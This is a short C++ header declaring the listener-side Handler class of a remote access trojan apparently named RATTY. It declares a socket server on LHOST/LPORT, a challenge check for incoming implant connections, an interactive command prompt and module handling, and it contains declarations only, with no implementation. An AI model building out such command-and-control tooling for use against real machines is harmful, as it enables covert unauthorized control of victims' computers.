#ifndef RAT_HANDLER
#define RAT_HANDLER

#include <CLI11.hpp>
#include <ratsignal.hpp>
#include <modules.hpp>

#include <iostream>
#include <utility>
#include <algorithm>
#include <random>

class Handler {
public:
    Handler(std::string lhost, int lport);
private:
    // determine if incoming connection is valid
    bool Challenge();
    // enable socket server
    void InitializeServer();
    // prompt user input
    void Interact();

    // generates random challenge string
    std::string GenerateChallenge();

    // inform RAT that handler has closed and should try continuing to reach out
    void NotifyClose();
    // take input and evaluate it to a RATTY command
    void ProcessCommand(const std::string& input);

    std::string LHOST;
    SocketHandle* rat_conn_ptr;
    Module* activeModule;
    int LPORT;
};

#endif